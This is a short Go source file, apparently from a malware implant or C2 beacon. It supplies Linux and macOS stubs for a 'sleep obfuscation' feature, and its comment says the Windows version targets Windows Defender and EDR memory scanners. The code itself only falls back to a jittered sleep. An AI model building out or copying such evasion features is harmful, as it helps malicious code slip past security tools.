//go:build !windows

package main

// Sleep obfuscation is Windows-specific (targets Windows Defender and EDR
// memory scanners). On Linux/macOS, we use the standard jittered sleep.

func registerSensitiveBuffer(_ string, _ *[]byte) {}
func obfuscatedSleep()                            { sleepJitter() }
func initSleepObfuscation()                       {}

var sleepObfuscationOn = false
